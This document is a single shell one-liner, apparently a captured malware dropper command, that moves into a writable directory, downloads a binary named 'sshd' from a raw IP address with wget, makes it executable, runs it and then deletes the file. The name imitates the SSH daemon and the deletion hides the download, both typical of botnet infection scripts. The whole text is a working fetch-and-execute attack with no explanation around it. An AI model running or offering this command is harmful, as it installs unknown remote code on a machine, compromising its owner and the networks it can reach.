cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.97.115/sshd; chmod +x sshd; ./sshd; rm -rf sshd
